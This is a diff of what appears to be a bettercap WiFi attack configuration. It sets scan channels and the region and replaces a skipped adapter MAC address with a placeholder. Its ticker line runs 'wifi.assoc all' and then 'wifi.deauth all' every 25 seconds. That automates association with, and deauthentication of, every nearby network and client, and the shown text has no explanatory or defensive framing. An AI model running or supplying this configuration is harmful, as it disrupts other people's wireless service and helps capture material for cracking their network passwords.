@@ -7,8 +7,8 @@ set wifi.recon.channel 1,2,3,4,5,6,7,8,9,11
 # set wifi.recon.channel 32,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140
 # set wifi.recon.channel 1,2,3,4,5,6,7,8,9,11,32,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140
 set wifi.region BR
-set wifi.assoc.skip 00:C0:CA:8D:99:6D
-set wifi.deauth.skip 00:C0:CA:8D:99:6D
+set wifi.assoc.skip MA:NA:GE:ME:NT:AP
+set wifi.deauth.skip MA:NA:GE:ME:NT:AP
 set ticker.period 25
 set ticker.commands clear; wifi.assoc all; sleep 10; wifi.deauth all
 #### RUN ##################################################################################
